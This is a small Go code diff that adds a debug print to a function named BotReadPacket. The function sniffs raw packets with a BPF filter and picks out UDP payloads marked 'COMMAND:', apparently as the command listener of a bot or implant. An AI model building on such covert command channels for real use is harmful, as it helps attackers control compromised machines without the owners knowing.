@@ -132,6 +132,7 @@ func BotReadPacket(fd int, vm *bpf.VM) (gopacket.Packet, bool) {
 	// Parse packet... hopefully
 	packet := gopacket.NewPacket(buf, layers.LayerTypeEthernet, gopacket.Default)
 	if udpLayer := packet.Layer(layers.LayerTypeUDP); udpLayer != nil {
+		fmt.Println(packet.Layer(layers.LayerTypeUDP).LayerType().String())
 		// Make sure this is my packet
 		if strings.Contains(string(packet.ApplicationLayer().Payload()), "COMMAND:") {
 			return packet, false
